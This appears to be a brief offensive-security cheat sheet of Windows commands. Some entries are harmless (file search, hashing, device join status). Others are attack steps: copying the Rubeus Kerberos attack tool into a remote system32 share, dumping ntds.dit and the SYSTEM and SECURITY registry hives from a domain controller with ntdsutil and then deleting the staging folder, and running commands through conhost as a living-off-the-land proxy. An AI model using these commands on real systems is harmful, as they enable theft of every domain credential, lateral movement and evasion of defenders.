# Copy files between systems
```batchfile
xcopy "C:\Rubeus.exe" \\<computer>.<domain.local>\C$\Windows\system32\
```

# Dump ntds.dit on a domain controller
```batchfile
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\xn--5o8hui" q q
xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\Active Directory\ntds.dit" C:\<dc>\
xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\registry\SYSTEM" C:\<dc>\
xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\registry\SECURITY" C:\<dc>\
rmdir /S C:\Windows\Temp\xn--5o8hui\
```

# Run commands via [conhost](https://lolbas-project.github.io/lolbas/Binaries/Conhost/)
```batchfile
conhost cmd.exe
```

# Find files or directories
```batchfile
dir "C:\Users\*.txt" /s
```

# Merge two binary files
```batchfile
copy /b cmd.exe+calc.exe new_cmd.exe
```

# Get hash of a file
```batchfile
certutil -hashfile C:\Windows\System32\cmd.exe SHA256
```

# [Displays the device join status](https://learn.microsoft.com/en-us/azure/active-directory/devices/faq#how-do-i-know-what-the-device-registration-state-of-the-client-is)
```batchfile
dsregcmd.exe /status
```
